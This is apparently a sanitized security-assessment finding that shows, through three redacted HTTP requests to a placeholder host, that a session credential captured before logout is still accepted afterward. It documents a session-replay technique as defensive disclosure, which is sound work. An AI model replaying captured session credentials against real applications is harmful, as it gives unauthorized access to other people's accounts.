# F-02 Technical Validation

> Sanitized reconstruction. Original routes, parameter names, session values, and response content are replaced. The session credential remained client-supplied in the request body, matching the tested session flow.

## Authenticated baseline

```http
POST /?object=1 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[captured-pre-logout-state]
```

The application returned authenticated content.

## Logout

```http
POST / HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=logout&state=[captured-pre-logout-state]
```

The normal logout flow completed.

## Reuse of the pre-logout state

The same previously issued state value was then reused against authenticated functionality:

```http
POST /?object=1 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[captured-pre-logout-state]
```

The application again returned authenticated content instead of rejecting the pre-logout credential.

## Security conclusion

The same session-state credential remained accepted after logout, demonstrating ineffective session revocation rather than only a client-side logout presentation issue.
